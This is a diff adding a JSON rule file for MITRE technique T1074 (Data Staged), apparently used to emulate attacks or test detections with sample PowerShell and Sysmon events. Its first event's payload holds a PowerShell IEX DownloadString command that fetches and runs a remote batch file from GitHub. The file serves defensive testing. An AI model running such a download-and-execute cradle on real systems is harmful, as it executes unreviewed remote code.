@@ -1,0 +1,39 @@
+{
+	"name": "T1074 - Data Staged",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Collected data is staged in a central location or directory prior to Exfiltration.",
+	"rules": {
+		"powershell_download": {
+			"enabled": true,
+			"source": "PowerShell",
+			"category": "4104",
+			"description": "Downloading script from powershell.",
+			"payload": {
+				"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat')"
+			}
+		},
+		"powershell_network": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Network connection detected",
+			"description": "Network activity from powershell.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"DestinationIp": "151.101.132.133",
+				"DestinationPort": 443,
+				"DestinationPortName": "https"
+			}
+		},
+		"log_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing collected data.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"TargetFilename": "C:\\data.log"
+			}
+		}
+	}
+}
